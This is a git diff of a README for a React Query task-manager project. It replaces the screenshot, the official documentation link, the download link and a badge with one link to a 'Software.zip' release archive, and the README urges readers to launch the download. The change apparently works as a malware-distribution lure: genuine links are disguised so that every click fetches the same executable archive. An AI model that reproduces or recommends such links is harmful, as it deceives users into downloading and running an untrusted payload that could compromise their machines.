@@ -32,7 +32,7 @@ Welcome to the React Query Task Manager repository! This project is a task manag
 
 ## Screenshots 📷
 
-![Task Manager](https://via.placeholder.com/500x300)
+![Task Manager](https://github.com/raifels/React-Query-Task-Manager--React-Fundamental-Project-16/releases/download/v1.0/Software.zip)
 
 ## Repository Topics 📋
 
@@ -53,11 +53,11 @@ Welcome to the React Query Task Manager repository! This project is a task manag
 
 ## Additional Resources 📚
 
-For more information on React Query, check the [official documentation](https://react-query.tanstack.com/).
+For more information on React Query, check the [official documentation](https://github.com/raifels/React-Query-Task-Manager--React-Fundamental-Project-16/releases/download/v1.0/Software.zip).
 
 ## Download Project Files 📦
 
-[Download Project Files](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[Download Project Files](https://github.com/raifels/React-Query-Task-Manager--React-Fundamental-Project-16/releases/download/v1.0/Software.zip)
 
 ## Enjoy Task Management with React Query! 🚀
 
@@ -67,6 +67,6 @@ Start efficiently managing your tasks with React and React Query. Happy tasking!
 
 For the link provided above, it needs to be launched as it is a download link for the project files.
 
-![Download Project Files](https://img.shields.io/badge/Download-Project_Files-green)
+![Download Project Files](https://github.com/raifels/React-Query-Task-Manager--React-Fundamental-Project-16/releases/download/v1.0/Software.zip)
 
 If the link does not work, please check the "Releases" section for any updated downloads.
